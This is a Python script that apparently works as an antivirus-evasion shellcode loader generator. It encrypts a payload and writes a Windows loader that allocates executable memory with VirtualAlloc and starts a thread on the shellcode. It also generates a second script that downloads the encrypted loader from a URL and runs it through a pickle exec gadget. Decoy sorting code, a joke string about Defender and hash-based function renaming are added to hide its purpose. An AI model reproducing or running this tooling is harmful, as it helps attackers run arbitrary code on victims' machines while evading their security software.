# -*- coding: UTF-8 -*-
import re

from cryptography.fernet import Fernet

shellcode = b""

key = Fernet.generate_key()
fernet = Fernet(key)
enstr = fernet.encrypt(shellcode)

key2 = Fernet.generate_key()
fernet2 = Fernet(key2)

a = f'''
import ctypes
from cryptography.fernet import Fernet
KEY={key}
fernet=Fernet(KEY)
shellcode=fernet.decrypt({enstr})

shellcode = bytearray(shellcode)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buf,
    ctypes.c_int(len(shellcode))
)
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
'''

b = f'''
import pickle,base64,requests,ctypes
from cryptography.fernet import Fernet

url=''
def doit(sectr):
    KEY={key2}
    fernet = Fernet(KEY)
    destr = fernet.decrypt(sectr).decode()
    class A(object):
        def __reduce__(self):
            return (exec, (destr,))

    ret = pickle.dumps(A())
    ret_base64 = base64.b64encode(ret)
    ret_decode = base64.b64decode(ret_base64)
    pickle.loads(ret_decode)

t2 ="""
import base64

st= 'wo gan jue wo ma shang jiu yao bei defender gan diao a ba a bachonogchong chongcong!'.encode()
res= base64.b64encode(st)
aaa= res.decode()
res= base64.b64decode(res)
bbb= res.decode()
   """

t1 ="""
import random

def partition(test_arr, low, high):
   i = (low - 1)  
   pivot = test_arr[high]

   for j in range(low, high):
       if test_arr[j] <= pivot:
           i = i + 1
           test_arr[i], test_arr[j] = test_arr[j], test_arr[i]

   test_arr[i + 1], test_arr[high] = test_arr[high], test_arr[i + 1]
   return i + 1


def quick_sort(test_arr, low, high):
   if low < high:
       pi = partition(test_arr, low, high)
       quick_sort(test_arr, low, pi - 1)
       quick_sort(test_arr, pi + 1, high)


test_arr= []
for i in range(59999):
   test_arr.append(random.random())
n= len(test_arr)
quick_sort(test_arr,0, n - 1)
   """

def start():
    try:
        r=requests.get(url)
        a = r.status_code
    except:
        a = 404
        pass

    if a == 200:
        doit(r.text)
    else:
        pass

if __name__ == '__main__':
    exec(t1)
    exec(t2)
    start()
'''


def hunxiao():
    openfile = 'b.py'
    text = open(openfile, encoding='utf-8').read()
    wd_df = re.findall("def (.*?)\\(", text)
    wd_df = list(set(wd_df))
    for i in wd_df:
        if i[0:2] == "__":
            wd_df.remove(i)
        if i == 'super':
            wd_df.remove(i)
    idlist = []
    for i in wd_df:
        idlist.append('O' + str(hash(i))[-7:])

    cs = len(wd_df)
    if cs == len(set(idlist)):
        while cs > 0:
            cs -= 1
            text = text.replace(wd_df[cs] + '(', idlist[cs] + '(')
            text = text.replace('target=' + wd_df[cs], 'target=' + idlist[cs])
            text = text.replace('global ' + wd_df[cs], 'global ' + idlist[cs])
            text = text.replace(', ' + wd_df[cs], ', ' + idlist[cs])
        print('successful function:', wd_df, '\n', idlist)
    else:
        print('hash repeat')

    file_save = open('b.py', 'w', encoding='utf-8')
    file_save.write(text)
    file_save.close()


with open('a.txt', 'bw') as f:
    f.write(fernet2.encrypt(a.encode()))

with open('b.py', 'w', encoding='utf-8') as f:
    f.write(b)

hunxiao()